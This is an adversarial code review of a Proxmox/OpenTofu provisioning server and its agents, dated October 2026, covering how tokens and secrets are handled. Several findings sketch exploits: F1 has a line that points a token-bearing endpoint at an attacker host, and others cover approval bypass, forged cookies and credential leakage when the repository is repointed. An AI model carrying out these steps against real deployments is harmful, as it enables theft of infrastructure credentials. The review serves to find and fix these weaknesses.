# Security review: token and secret handling

Snapshot: **October 21, 2026**, working tree on `proxmox-e2e`, including uncommitted work.
This was an adversarial code review, not a penetration test or production audit. Each
finding is marked **CONFIRMED** (traced in code) or **PLAUSIBLE** (needs a runtime check).
F1, F2, F4, F7, and F9 were re-checked independently against the code.

## Verdict

The **mechanisms** are mostly sound: enrollment tokens are random, hashed, and claimed
atomically; agents pin the server CA; store values use per-value AES-GCM envelopes bound to
key and version; no API response carries a secret; the real Proxmox token used in local
testing appears nowhere in `.dev/` logs, outbox, or artifacts, raw or base64.

The **trust model** is the problem. The lab repository, and anyone holding a web session,
decide which secret is released, to which endpoint (including `http://` or unverified
TLS), inside which container image, on which agent, and whether a human approves. The
default approval is `automatic`, new commits start runs, and the plan step already carries
the secrets. "Secrets are write-only" holds for the API, not end to end.

## Findings

| ID | Sev | Status | Title | Main location | Token |
|---|---|---|---|---|---|
| F1 | High | CONFIRMED | Lab repo picks secret destination, image, agent, and approval; runs start automatically | `InventoryUpdater.cs:122`, `Policy.cs:66`, `RunFactory.cs:21-47,83`, `LabRepositoryLoader.cs:423-425` | Proxmox token, backend secrets |
| F2 | High | CONFIRMED | Any session can exfiltrate secrets by repointing the repository; Git credential not bound to URL | `Endpoints.cs:67-85`, `RepositorySync.cs:156-165` | All secrets, Git credential |
| F3 | Medium | CONFIRMED | Proxmox token over `http://` or unverified TLS; custom CA not passed to OpenTofu | `installation.schema.json:14`, `proxmox/src/client.rs:344`, `RunFactory.cs:42` | Proxmox token |
| F4 | Medium | CONFIRMED | Approval decided from the planning agent's own `changes` field; plan file is agent-supplied | `RunEngine.cs:318-336` | Everything apply uses |
| F5 | Medium | CONFIRMED | Empty labels mean "any agent"; labels come only from the repo | `Policy.cs:86-97`, `RunEngine.Agents.cs:42-45` | Proxmox token, backend secrets |
| F6 | Medium | CONFIRMED | Stateless cookies, no revocation; data-protection key ring stored in the clear, warning suppressed | `Program.cs:73-98`, `AccountEndpoints.cs:135-140`, `appsettings.json:8` | Session |
| F7 | Low | CONFIRMED | Masking gaps: agent `outputs_json` unmasked; server masks only from memory; literal matching only; logs unencrypted | `attempts/mod.rs:327`, `AttemptFiles.cs:23-43,101-105`, `logs.rs:116-118` | Attempt secrets |
| F8 | Low | CONFIRMED | Generated enroll command puts the token in argv / shell history | `Endpoints.cs:356-359`, `justfile` | Enrollment token |
| F9 | Low | CONFIRMED | Renewal unbounded; the previous serial can renew and evict the current one | `AgentServices.cs:198-220,240` | Agent cert |
| F10 | Low | PLAUSIBLE | `secretEnv` visible via `podman inspect` / container `config.json` | `tools/mod.rs:273-277` | secretEnv values |
| F11 | Low | CONFIRMED | AEAD context omits visibility; default KEK path inside the data dir | `Envelope.cs:30,141-142`, `VariableStore.cs:382-388` | Store secrets |
| F12 | Low | CONFIRMED | Git token over `http://`; SSH `accept-new`; key file chmod after write | `RepositoryMirror.cs:253-259,272-283` | Git credential |
| F13 | Low | CONFIRMED | Setup-code chmod after write; setup race; login timing reveals usernames | `AccountEndpoints.cs:36-37,88-106,116-117` | Setup code, password |
| F14 | Info | CONFIRMED | `{other:?}` on a ServerMessage would print assignment secrets | `connection.rs:188` | Attempt secrets |
| F15 | Info | CONFIRMED | Unauthenticated `Enroll` accepts 64 MiB messages, no rate limit | `Program.cs:65-71` | Enrollment |
| F16 | Info | CONFIRMED | Original agent can append logs to an attempt after reassignment | `AgentServices.cs:150-168` | Logs |

### F1 (High): the lab repository is a secret-exfiltration channel with no human in the loop

Each new commit makes `InventoryUpdater` create a provision run for every guest whose
inputs changed. The repository picks the store key used as the Proxmox token, the endpoint
and `tls.verify`, the OpenTofu image (`recipe.image`) and root module, backend env secrets,
the approval policy (default `automatic`), and agent labels (default: any). The **plan**
step already receives `PROXMOX_VE_API_TOKEN` and backend secrets; `tofu plan` runs provider
code and the image entrypoint is chosen by the repo. Observe runs send `PVEAPIToken` to
whatever endpoint the repository names.

*Exploit:* push `endpoint: http://attacker:8006/` or `image: attacker/img`; within one poll
interval the token leaves. Approval is never reached because plan runs before approval.

*Fix:* server-side **release grants** per secret (allowed endpoint hosts, executors, image
digests, agents/labels) enforced in `ResolveForAttemptAsync`; server-level approval floor
that the repository can only tighten; pin allowed OpenTofu images by digest.

### F2 (High): any session can extract every secret

`PUT /api/repository` replaces the URL but keeps `system/git/credential`. The next fetch
sends that credential to the new host (even over `http://`), and the new repository then
drives F1. A stolen or forged cookie (see F6) is therefore enough to read all secrets.

*Fix:* clear the Git credential when scheme/host/port changes; require password
re-authentication for repository changes; F1 grants remove the larger impact.

### F3 (Medium): Proxmox token without transport security

The schema and client accept `http`; `verify: false` selects `AcceptAnyCertificate` and
sets `PROXMOX_VE_INSECURE=true`; `caCertificate` never reaches OpenTofu, so self-signed
installations are pushed to `verify: false` (the example lab and `tests/proxmox/run.sh`
both do). A LAN attacker who can spoof the Proxmox address collects the token from every
five-minute observe run.

*Fix:* refuse `http://` for token-bearing endpoints; mount the CA into the OpenTofu
container (`SSL_CERT_FILE` or provider option); add `tls.fingerprint` pinning.

### F4 (Medium): a compromised agent can bypass manual approval

`DecideApproval` requires approval only when `changes.length > 0` or `counts.delete > 0`.
An agent reporting `hasChanges: true, changes: []` with any `plan.tar.gz` gets an automatic
approval even under `approval: manual`; apply then executes that plan, whose embedded
configuration runs with the token.

*Fix:* under a manual policy, require approval whenever `hasChanges` or a plan artifact
exists; summarize plans independently of the producing agent (or on a second agent); pin
apply to the planning agent and show plan provenance in the approval view.

### F5 (Medium): agent placement is not a secret boundary

`ResolveLabels` defaults to `[]` and dispatch accepts any agent with all required labels.
A test agent or an agent for another site receives production tokens; a repository edit
can widen placement silently.

*Fix:* per-secret agent allowlists enforced in `AssignmentBuilder`; warn when a
token-bearing run has no label constraint.

### F6 (Medium): sessions cannot be revoked; cookie-signing keys in the clear

Stateless 12 h sliding cookie, no security stamp, logout only clears the local cookie, no
password change or sign-out-everywhere. `.dev/server/data-protection/key-*.xml` holds an
unencrypted `<masterKey>`; `appsettings.json` hides the warning; `SameAsRequest` means no
`Secure` flag unless the request is HTTPS. A data-volume backup lets someone forge an admin
cookie, then F2 applies.

*Fix:* encrypt the key ring with a KEK-backed `IXmlEncryptor`; per-user security stamp;
absolute session lifetime; `SecurePolicy = Always` behind TLS; stop suppressing warnings.

### F7 (Low): masking gaps

- The agent masks only `error`; `outputs_json` is sent and kept in the outbox unmasked.
- Server masking uses an in-memory dictionary filled at dispatch and dropped on the first
  result, so after a restart or for late results nothing is masked server-side.
- Literal matching only (no base64/URL/JSON-escaped forms); `sanitize()` runs before
  masking, so secrets containing control characters never match; 16 KiB truncation can
  leak a prefix; server attempt logs are plaintext JSONL.

*Fix:* mask outputs on the agent; derive server masking from `SecretResolution` rows so it
survives restarts; add encoded variants; mask after truncation and against sanitized
forms; encrypt logs at rest.

### F8–F16 (Low/Info)

- **F8:** generate `OCTOPUSHY_ENROLLMENT_TOKEN=… octopushy agent enroll …` or read from
  stdin; shorten default/maximum token expiry (currently up to 7 days).
- **F9:** allow renewal only inside the renewal window and only from the current serial;
  log renewals; optionally cap renewal chains.
- **F10:** deliver secrets as 0400 files on a tmpfs mount, not container env vars.
  Confirm with `podman inspect … --format '{{.Config.Env}}'` during an attempt.
- **F11:** add visibility and scope to the AEAD context (re-encryption migration); refuse a
  KEK inside the data directory unless explicitly allowed.
- **F12:** refuse `http://` with credentials; require configured `known_hosts`; create
  key/askpass files with `UnixCreateMode` 0600.
- **F13:** create the setup-code file with its final mode; make setup atomic; run a dummy
  hash verification for unknown usernames.
- **F14:** print only the message kind. **F15:** small message limit and rate limit on
  `Enroll`. **F16:** re-check `AgentId` per log batch.

## Done right (do not regress)

- Enrollment tokens: 32 CSPRNG bytes, stored as SHA-256 only, never listed, claimed with an
  atomic `UPDATE … WHERE used_at IS NULL`, expiry enforced.
- Agent pins the CA by the fingerprint in the token; tonic has no system roots; the server
  ignores the CSR subject and issues CN/SAN = agent ID; EKUs separated; path length 0.
- Per-call identity from the client cert plus a serial check in the database; disabling or
  deleting an agent disconnects it; Started/Log/Result/Heartbeat check attempt ownership.
- Agent key never leaves the host; files written atomically with 0600; crash-safe renewal.
- Store: per-value data keys, AES-GCM, AAD bound to key and version, data keys zeroed;
  KEK created with `CreateNew` 0600; startup refuses to mint a new KEK over existing data;
  `system/` scope unreachable from user endpoints and lab references; secret→plain refused;
  all-or-nothing, audited release; pinned versions rechecked at each dispatch.
- No secret, ciphertext, or token hash in DTOs or the OpenAPI document; EF SQL logging off.
- Git credentials via `GIT_ASKPASS`/env, never argv; masked errors; no global git config.
- Proxmox client: redacted `Debug`, sensitive auth header, redirects off.
- Executors: secrets never in argv; `--log-driver=none --cap-drop=all --read-only
  no-new-privileges`; sensitive OpenTofu outputs withheld; plan JSON never logged.
- Artifacts encrypted at rest, SHA-256 checked, apply refuses a plan whose hash differs.
- Cookies `HttpOnly` + `SameSite=Strict`; Identity v3 hasher; login/setup rate-limited;
  CSP and frame headers in Caddy; `safeNext` blocks `//` and `/\`.

## Token lifecycles

```mermaid
sequenceDiagram
  participant Admin
  participant API as API :8080
  participant DB
  participant Agent
  participant AE as Agent endpoint :8443
  Admin->>API: POST /api/agents/tokens (cookie)
  API->>DB: SHA256(secret), labels, expiry (5 min – 7 d)
  API-->>Admin: opy1.<secret>.<caFP> + command (token in argv, F8)
  Agent->>AE: GET /agent/ca.pem (unverified)
  Agent->>Agent: sha256(CA) == caFP, else abort
  Agent->>Agent: P-256 key + CSR (key stays local)
  Agent->>AE: Enroll(token, CSR) over TLS pinned to CA
  AE->>DB: lookup hash; unused and not expired
  AE->>AE: sign CN=agentId, clientAuth, 30 days
  AE->>DB: atomic claim, insert agent + serial
  AE-->>Agent: cert, CA
```

```mermaid
sequenceDiagram
  participant Git as Lab repo
  participant S as Server
  participant DB
  participant A as Agent
  participant T as OpenTofu / Proxmox
  Git->>S: new commit (poll)
  S->>DB: auto-create run; repo chooses key, endpoint, image, labels, policy (F1, F5)
  S->>DB: dispatch plan: pin versions, decrypt, audit row
  S->>S: register values for masking (memory only, F7)
  S->>A: Assignment{secrets} over mTLS
  A->>T: secretEnv by name (-e NAME, F10) / PVEAPIToken header (TLS per repo, F3)
  T-->>A: output, masked literally
  A->>S: logs, result (outputs unmasked), plan artifact (stored encrypted)
  S->>S: approval from agent's change count (F4), default automatic
  S->>A: apply with approved plan + secrets again
  S-->>A: ResultAck → agent deletes outbox and workspace
```

## Remediation order

**Quick fixes (small, independent PRs)**

1. Default approval `manual`; require approval whenever `hasChanges` or a plan artifact
   exists (F1, F4).
2. Clear the Git credential on host change; re-authenticate for repository changes (F2).
3. Refuse `http://` for Proxmox endpoints and credentialed Git URLs (F3, F12).
4. Mask `outputs_json` on the agent; mask after truncation and sanitization; add base64
   and URL-encoded variants (F7).
5. Encrypt the data-protection key ring; stop suppressing its warnings; `Secure` cookies
   behind TLS (F6).
6. Token in env, not argv, in the generated command; shorter expiry (F8).
7. Renewal only within the window and from the current serial (F9).
8. Create sensitive files with their final mode; drop `accept-new` (F12, F13).
9. Small `Enroll` message limit (F15); no `{:?}` on server messages (F14); per-batch
   ownership check (F16).

**Structural changes**

1. Server-side secret release grants (F1, F2, F5).
2. Approval independent of the planning agent (F4).
3. CA to OpenTofu and fingerprint pinning, so `verify: false` is never needed (F3).
4. Real sessions: security stamp, sign-out everywhere, password change, absolute expiry (F6).
5. Short-lived per-run Proxmox tokens instead of a long-lived token on every plan/observe.
6. Encryption at rest for server logs, the agent outbox, and workspaces; secrets as files (F7, F10).
7. Visibility and scope in the AEAD context with a re-encryption migration (F11).

## Addendum from the plan review

An independent review of the remediation plan found that the quick fixes above do **not**
close F1, and added findings. The ones marked CONFIRMED were re-checked in code.

| ID | Sev | Status | Finding | Location |
|---|---|---|---|---|
| F17 | High | CONFIRMED | Plan-time is repository-chosen code execution with the privileged token in the environment (`data "external"`, provider downloads at `init`, image by tag with `--pull=missing`). Approval comes *after* this, so an approval floor alone protects nothing; endpoint or image grants cannot stop egress to arbitrary hosts. | `AssignmentBuilder.cs:45-51`, `RunFactory.cs:44-58`, `tools/mod.rs:242` |
| F18 | High | CONFIRMED | Observe runs (≈288/day per installation) have no approval step and send the token to the repository-chosen endpoint automatically. | `RunFactory.cs:151`, `Planner.cs:34-63`, `InventoryUpdater.cs:125-139` |
| F19 | Medium | CONFIRMED | Store keys have no purpose: any user-scope key (including future SSH keys) can be named as `connection.token` and sent as a `PVEAPIToken` header. | `Entities.cs:407-422`, `LabRepositoryLoader.cs:423-425` |
| F20 | Medium | CONFIRMED | Dispatch ignores the agent's `tool_runtime`; on a `local` agent repository HCL runs on the agent host and can read the agent key. | `AgentServices.cs:106`, `RunEngine.Agents.cs:42-44` |
| F21 | Medium | CONFIRMED | If the CA store entries are missing, startup silently creates a new CA, breaking every pinned agent (the KEK has a guard against this; the CA did not). **Mitigated October 22, 2026:** startup now refuses while any agent or enrollment token exists. Concurrent first starts of two replicas can still race. | `AgentCertificateAuthority.cs:43-56` |
| F22 | Medium | CONFIRMED | **Partly mitigated October 22, 2026:** a startup warning and a backup guide; the default is unchanged. One data-directory backup plus the database decrypts everything: KEK (default `<data>/keys/kek`), data-protection key ring, and the CA key (stored under the KEK). | `Envelope.cs:30`, `Program.cs:77`, `AgentCertificateAuthority.cs:22,52` |
| F23 | Low | PLAUSIBLE | Writable plugin cache shared across attempts (`:z`) may let one run leave artifacts later runs use; depends on OpenTofu re-verifying cached hashes. | `tools/mod.rs:253-256` |
| F24 | Info | CONFIRMED | OpenTofu state is outside the KEK boundary and can contain sensitive values; accept explicitly or use OpenTofu state encryption. | design |

**What actually closes F1/F17/F18 for a single operator:**

1. **Revision trust gate.** No secret-bearing step runs for a commit until the operator
   marks it trusted (or the server verifies a commit signature against allowed keys).
   Observe and plan use the latest trusted revision only.
2. **Split Proxmox tokens.** A read-only token (`VM.Audit`, `Sys.Audit`, pool-scoped) for
   observe, verify, and plan; the privileged token is released **only to apply, after
   approval**. This is what makes the approval floor meaningful.
3. **Least privilege on the privileged token:** privilege-separated API token, pool-scoped
   ACLs so unrelated guests are out of reach, no `Permissions.Modify`/`Sys.Modify`, one
   token per installation.
4. **Purpose + destination bindings** per store key (F19), and refusal of token-bearing
   work on `local` runtimes (F20).
5. Later: egress allowlist for the OpenTofu container and providers baked into a
   digest-pinned image with `-plugin-dir` (F17, F23).
